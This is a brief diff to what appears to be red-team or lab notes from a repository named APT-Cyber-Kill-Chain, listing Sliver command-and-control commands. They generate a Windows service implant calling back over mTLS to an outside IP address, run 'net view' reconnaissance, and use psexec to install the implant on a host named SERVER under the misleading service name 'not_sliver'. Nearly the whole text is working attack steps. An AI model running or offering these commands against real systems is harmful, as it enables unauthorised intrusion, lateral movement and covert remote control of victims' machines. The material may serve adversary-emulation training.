@@ -54,6 +54,8 @@ sliver-client import /home/kali/git-test/APT-Cyber-Kill-Chain//tools/sliver/clie
 
 generate --format service --mtls 18.143.102.216:8080 --name ENTITLED_KILT -> name = ENTITLED_KILT.exe
 
-psexec --custom-exe ./ENTITLED_KILT.exe --service-name not_sliver SERVER
+execute -o net view
+
+psexec --custom-exe ./data/payloads/ENTITLED_KILT.exe --service-name not_sliver SERVER
 y
 
